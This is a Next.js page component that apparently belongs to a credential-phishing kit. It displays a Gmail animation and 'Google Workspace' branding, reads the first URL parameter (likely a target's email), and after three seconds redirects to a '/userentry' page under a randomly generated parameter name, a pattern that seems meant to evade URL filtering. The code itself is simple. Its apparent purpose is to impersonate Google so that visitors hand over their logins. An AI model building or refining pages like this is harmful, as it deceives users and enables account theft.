'use client';

import { useEffect } from 'react';
import { useSearchParams } from 'next/navigation';
import { generateRandomParam } from '@/lib/utils';
import SearchParamsWrapper from '../../components/SearchParamsWrapper';
import { notFound } from 'next/navigation';
import '../../public/styles/load.css'; 

function LoadPageContent() {
  const searchParams = useSearchParams();
  // Get the first query parameter value (regardless of key name)
  const data2 = Array.from(searchParams.values())[0];

  useEffect(() => {
    if (!data2) {
      window.location.href = '/error';
      return;
    }

    // Redirect after 3 seconds
    const timer = setTimeout(() => {
      const randomParam = generateRandomParam();
      window.location.href = `/userentry?${randomParam}=${data2}`;
    }, 3000);

    return () => clearTimeout(timer);
  }, [data2]);

  if (!data2) {
    notFound(); // This will render your app/not-found.tsx
      }

  return (
<>
        <div className="gif-container">
          <object data="/gmail_animation.gif" style={{ height: '420px', width: '550px' }}></object>
        </div>

        <div className="container">
          <div className="underline-background"></div>
          <div className="underline"></div>
          <div className="text">
            <span>Google</span> Workspace
          </div>
        </div>
</>
  );
}

export default function LoadPage() {
  return (
    <SearchParamsWrapper>
      <LoadPageContent />
    </SearchParamsWrapper>
  );
}